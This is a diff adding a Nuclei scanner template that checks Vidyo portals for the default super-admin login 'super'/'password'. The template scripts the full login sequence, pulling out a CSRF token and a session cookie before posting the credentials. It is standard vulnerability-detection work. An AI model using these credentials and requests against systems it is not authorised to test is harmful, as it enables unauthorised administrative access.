@@ -1,0 +1,67 @@
+id: vidyo-default-login
+
+info:
+  name: Vidyo Default Login
+  author: izn0u
+  severity: medium
+  description: Vidyo default credentials were discovered.
+  reference:
+    - https://support.vidyocloud.com/hc/en-us/articles/226265128
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
+    cvss-score: 5.8
+    cwe-id: CWE-522
+  metadata:
+    max-request: 2
+  tags: vidyo,default-login
+
+http:
+  - raw:
+      - |
+        GET /super/login.html?lang=en HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+      - |
+        POST /super/super_security_check;jsessionid={{session}}?csrf_tkn={{csrf_tkn}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Origin: {{BaseURL}}
+        Referer: {{RootURL}}/super/login.html?lang=en
+        Cookie: JSESSIONID={{session}} ; VidyoPortalSuperLanguage=en
+
+        username={{username}}&password={{password}}
+
+    payloads:
+      username:
+        - super
+      password:
+        - password
+    attack: pitchfork
+
+    extractors:
+      - type: regex
+        name: csrf_tkn
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - 'csrf_tkn=([A-Za-z0-9.-]+)'
+
+      - type: kval
+        name: session
+        internal: true
+        part: header
+        kval:
+          - JSESSIONID
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "/super/index.html"
+
+      - type: status
+        status:
+          - 302
+# digest: 4a0a0047304502203a216f6b650e776933a764ea9bf8e455e1460b4dc9b69fabaa055aa40b82dc1d0221009aaf7f263825259196c1e05aaed64240e9391ad17f8c90f4b773f267f9ff87a5:922c64590222798bb761d5b6d8e72950
